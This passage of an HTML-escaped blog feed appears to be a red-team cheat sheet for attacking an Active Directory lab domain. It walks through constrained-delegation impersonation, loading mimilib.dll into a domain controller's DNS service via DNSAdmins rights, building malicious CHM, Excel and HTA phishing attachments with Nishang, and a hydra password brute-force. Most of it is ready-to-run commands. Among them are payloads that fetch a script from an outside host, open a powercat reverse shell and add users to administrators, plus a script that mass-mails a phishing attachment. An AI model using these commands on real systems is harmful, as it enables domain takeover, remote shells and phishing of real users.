class="n">ptt&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;p>An alternative in case of SYSTEM level compromise of a machine with constrained delegation enabled:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Impersonate the Administrator account:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="no">Reflection.Assembly&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">LoadWithPartialName&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;System.IdentityModel&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">out-null&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$idToImpersonate&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">New-Object&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Security&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Principal&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">WindowsIdentity&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;administrator&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$idToImpersonate&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">Impersonate&lt;/span>&lt;span class="p">()[&lt;/span>&lt;span class="no">System.Security.Principal.WindowsIdentity&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">GetCurrent&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Try to access the service (in case the COMPUTER1 is allowed to delegate to DC CIFS service):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">$&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;h2 id="dnsadmin">DNSAdmin&lt;/h2>
+&lt;p>It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of &lt;em>dns.exe&lt;/em> (SYSTEM). In case the DC also serves as DNS, this will provide us escalation to DA. Privileges to restart the DNS service are needed.&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Enumerate the members of the DNSAdmis group&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroupMember&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;DNSAdmins&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADGroupMember&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;DNSAdmins&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we know the members of the DNSAdmins group, we need to compromise a member.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Install DNS RSAT tools (if not present):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-WindowsCapability&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="n">RSAT&lt;/span>&lt;span class="p">*&lt;/span> &lt;span class="n">-Online&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Add-WindowsCapability&lt;/span> &lt;span class="err">–&lt;/span>&lt;span class="n">Online&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSAT DNS):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># RSAT DNS&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">dnscmd&lt;/span> &lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">config&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">serverlevelplugindll&lt;/span> &lt;span class="p">\\&lt;/span>&lt;span class="n">FILESERVER_IP&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">dll&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">mimilib&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">dll&lt;/span> &lt;span class="c"># Absolute path&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or using DNSServer module (needs RSAT DNS):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># RSAT DNS&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$dnsettings&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Get-DnsServerSetting&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-All&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$dnsettings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ServerLevelPluginDll&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;\\FILESERVER_IP\dll\mimilib.dll&amp;#34;&lt;/span> &lt;span class="c"># Absolute path&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DnsServerSetting&lt;/span> &lt;span class="n">-InputObject&lt;/span> &lt;span class="nv">$dnsettings&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="n">-Verbose&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>From a CMD shell restart the DNS service (assuming that the DNSAdmins group has the permission to do so):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">sc &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="n">stop&lt;/span> &lt;span class="n">dns&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">sc &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span> &lt;span class="nb">start &lt;/span>&lt;span class="n">dns&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>By default, the mimilib.dll logs all DNS queries to &lt;strong>C:\Windows\System32\kiwidns.log&lt;/strong>&lt;/p>
+&lt;p>If you want to implement a custom DLL to perform custom actions (i.e. add a user to the Administrators group), it is possible to use the template present at this link &lt;a href="https://github.com/kazkansouh/DNSAdmin-DLL" target="_blank" rel="noopener">DNSAdmin-DLL&lt;/a>. In fact, the DLL must export predefined functions to be accepted by the DNS service.&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="phishing">Phishing&lt;/h2>
+&lt;p>In order to perform a phishing attack it is necessary to perform the following steps:&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Find the mail server by looking at SMTP open ports (25, 587, 465):&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="mf">25&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mf">587&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mf">465&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">powercat&lt;/span> &lt;span class="n">-c&lt;/span> &lt;span class="n">smtp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="n">-p&lt;/span> &lt;span class="nv">$_&lt;/span> &lt;span class="n">-t&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-d&lt;/span>&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Generate a malicious attachment to be sent within the mail message:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-CHM&lt;/span> &lt;span class="n">-PayloadScript&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Invoke-PowerShellTcp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="n">-HHCPath&lt;/span> &lt;span class="s2">&amp;#34;C:\Program Files (x86)\HTML Help Workshop&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-CHM&lt;/span> &lt;span class="n">-PayloadURL&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">50&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">53&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">powercat_connect&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="n">-HHCPath&lt;/span> &lt;span class="s2">&amp;#34;C:\Program Files (x86)\HTML Help Workshop&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-CHM&lt;/span> &lt;span class="n">-Payload&lt;/span> &lt;span class="s2">&amp;#34;-c net localgroup administrators CYBERLAB\STUDENT01 /add&amp;#34;&lt;/span> &lt;span class="n">-HHCPath&lt;/span> &lt;span class="s2">&amp;#34;C:\Program Files (x86)\HTML Help Workshop&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-Excel&lt;/span> &lt;span class="n">-PayloadURL&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">50&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">53&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">powercat_connect&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span> &lt;span class="n">-DDE&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-HTA&lt;/span> &lt;span class="n">-PayloadURL&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">//&lt;/span>&lt;span class="mf">192.168&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">50&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mf">53&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="n">powercat_connect&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-HTA&lt;/span> &lt;span class="n">-Payload&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c . \\10.10.10.10\tmp\powercat.ps1; powercat -c ws01 -p 443 -e cmd&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Out-HTA&lt;/span> &lt;span class="n">-Payload&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c net localgroup administrators cyberlab\student01 /add&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>
+&lt;p>Connect to the SMTP server and the send the message to the recipients:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># phishing.ps1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$recipients&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="vm">@&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;lbunce@cyberlab.local&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;bschonfelder@cyberlab.local&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$sender&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;giovanni@pecoraro.local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$subject&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;Important mail&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$body&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;Please open the attachment&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$smtp_server&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;smtp.cyberlab.local&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$smtp_port&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">25&lt;/span>&lt;span class="nv">$attachment_path&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;.\doc.chm&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">Foreach&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$rcpt&lt;/span> &lt;span class="k">in&lt;/span> &lt;span class="nv">$recipients&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">Write-Host&lt;/span> &lt;span class="n">-ForegroundColor&lt;/span> &lt;span class="n">Yellow&lt;/span> &lt;span class="s2">&amp;#34;Sending phishing email to &lt;/span>&lt;span class="nv">$rcpt&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">Send-MailMessage&lt;/span> &lt;span class="n">-To&lt;/span> &lt;span class="nv">$rcpt&lt;/span> &lt;span class="n">-From&lt;/span> &lt;span class="nv">$sender&lt;/span> &lt;span class="n">-Subject&lt;/span> &lt;span class="nv">$subject&lt;/span> &lt;span class="n">-Body&lt;/span> &lt;span class="nv">$body&lt;/span> &lt;span class="n">-SmtpServer&lt;/span> &lt;span class="nv">$smtp_server&lt;/span> &lt;span class="n">-Port&lt;/span> &lt;span class="nv">$smtp_port&lt;/span> &lt;span class="n">-Attachments&lt;/span> &lt;span class="nv">$attachment_path&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol>
+&lt;h2 id="brute-forcing">Brute-forcing&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># hydra.exe&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.\&lt;/span>&lt;span class="n">hydra&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="n">-L&lt;/span> &lt;span class="p">..\&lt;/span>&lt;span class="n">usernames&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="n">-P&lt;/span> &lt;span class="p">..\&lt;/span>&lt;span class="mf">500&lt;/span>&lt;span class="n">-worst-passwords&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="s2">&amp;#34;http-post-form://192.168.2.50:8080/j_acegi_security_check:j_username=^USER^&amp;amp;j_password=^PASS^&amp;amp;from=%2FasynchPeople%2F&amp;amp;Submit=Sign+in:Invalid&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr></description></item></channel></rss>
